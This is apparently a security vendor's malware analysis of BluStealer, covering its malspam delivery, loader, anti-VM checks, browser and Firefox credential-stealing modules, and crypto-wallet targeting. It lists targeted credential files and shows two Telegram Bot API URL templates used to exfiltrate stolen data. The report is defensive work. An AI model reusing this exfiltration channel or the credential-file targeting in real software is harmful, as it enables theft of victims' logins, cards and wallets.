BluStealer is a new information-stealing malware that contains the functionality to steal
login credentials, credit card data, cryptocurrency and more. This harvested data is returned
to the attacker via SMTP and the Telegram Bot API.
The malware consists of a loader built in Visual Basic®, which is used to load open-source
.NET assembly hack tools such as ChromeRecovery and ThunderFox. The payloads
contained within the loader vary from sample to sample, which highlights the malware
author’s ability to customize each component separately.

Technical Analysis
Infection Vector
BluStealer has been observed spreading through malspam campaigns. Attackers using
BluStealer have also made malicious email samples available on online forums. The emails
masquerade as coming from legitimate organizations to trick the victim. The samples
include .iso attachments, as well as download URLs.
The received messages urge the victims to immediately open and fill out their details to
rectify whatever “issue” it is they state has occurred. Typically, these will be something like a
missed delivery, or shipping fee due. The email attachments/download URLs contain
the.NET Loader, which loads the malicious payloads.
Loader
The initial sample used for analysis in this post is a Windows Installation (ISO) file which
was delivered as part of a malicious email campaign as mentioned above.
Contained within the ISO file is a 32-bit Windows® executable. The file is Visual Basic 6
compiled, and highly encrypted. The file is called “Your DHL Shipment Notification.pdf.exe.”
This naming convention is used to lure the victim into clicking the malicious executable.

The sample contains a resource section (which is typically named “.rsrc”) that is unusually
large. Typically, the .rsrc section contains the resources used by the executable, such as
icons, images and menus. Malware also uses this section to embed arbitrary data, such as
executable files. This suggests this file is likely a loader. This section also has very high
entropy, which is indicative of the file being encrypted.

BluStealer contains anti-VM (virtual machine) techniques that help the threat remain
undetected and impede analysis, as security researchers often use this technology to safely
test threats. The malware will check the System32 WMI class to check for the presence of a
virtual machine. The list of VMs it searches for includes VMware Virtual Platform and Virtual
Box. If the presence of a VM is detected on the infected machine, then the process
execution will be stopped.
Looking at the sample in debugging software OllyDbg reveals some of the functionality
contained within the PE file, as well as the modules the malware loads. Here we can see
initial evidence that the malware contains keylogging, screen recording and crypto stealing
functionality.

The loader decrypts the payloads stored in the resource section using an AES algorithm
encryption key. The command line utility “AppLaunch.exe” is then executed to launch the
.NET executable’s first payload.
ChromeRecovery Stealing Module
The .NET executable “sdedffggdg.exe’ is dropped to the directory
“User/AppData/Microsoft/Windows/Templates."

This file’s internal name is “ChromeRecovery.exe” – it is the core stealing module of
BluStealer. The file is a 32-bit .NET executable.

Figure 4 - Loaded module is called “ChromeRecovery”

ChromeRecovery begins by scanning the infected machines for any potential login
credentials for web browsers, FTP clients and email clients. In the screenshot below, the
malware can be seen searching through the directories of various well known web
browsers, including Chrome™ and Opera.

All targeted web browsers are as follows.

Analyzing the module with debugger and .NET assembly editor dnSpy, we can see the
formatting of the stolen credentials.

ChromeRecovery also performs a fingerprint of the victim’s system, gathering information
that can be seen below. This includes Windows Version, AV Information, CPU Name, GPU
Name, RAM Amount, Public and Local IP Address and location.

BluStealer writes all its stolen data, including passwords, to a file called “credentials.txt.”

Within the resource section of ChromeRecovery.exe is an additional 32-Bit .NET file called
“ConsoleApp8.exe.” This file is used to steal credit card information from the targeted
machine.

ThunderFox Stealing Module
When ChromeRecovery has finished execution, the main loader loads its second PE
module from the resource section into memory and decrypts it. This results in another 32-bit
.NET assembly file called “ThunderFox.exe” being dropped.
ThunderFox targets Mozilla® products, which can be seen in the screenshot below. It also
extracts login credentials from the following directories: logins.json, signons.sqlite, key4.db,
key3.db, cert9.db, and cert8.db.
As with ChromeRecovery, this harvested data is stored in the “credentials.txt,” using the
same format.

Cryptocurrency Stealing
The core section of BluStealer, which is built in Visual Basic, performs the cryptocurrencystealing functionality by scanning the victim’s machine for any folders containing
cryptocurrency. The crypto wallets that are targeted include Zcash, Armory, Bytecoin, Jaxx
Liberty, Exodus, Ethereum, Electrum, Guarda and Coinomi.
Data Exfiltration
BluStealer exfiltrates all the data it’s gathered into “credentials.txt” through Simple Mail
Transfer Protocol (SMTP) and the Telegram Bot API. This API is an HTTP-based interface
created for developers. It allows the attacker to interact with their bot through a web
browser by issuing commands.
The Telegram API commands utilized to exfiltrate data via this method are as follows.
https://api.telegram.org/bot<your-bot-token>/sendMessage?chat_id=<your-chatid>&text=<your-message>
https://api.telegram.org/bot<your-bot-token>/sendDocument?chat_id=<your-channelid>&caption=<your-caption>

Conclusion
The flexible nature of BluStealer means that this malware family can cause damage to both
enterprise devices as well as personal devices. In its current state, BluStealer appears to be
aimed toward targeting individuals and their personal computers. The malware goes after
browser credentials, FTP applications, credit card details, and personal crypto wallets.
Crypto wallets contain data that people are less likely to store on their work device.
But this does not mean BluStealer couldn’t cause a lot of damage on an enterprise system.
The malware’s evasiveness and credential-stealing functionality could be used by a
successful threat actor to carve out important information and data from corporate devices
before exfiltrating them.
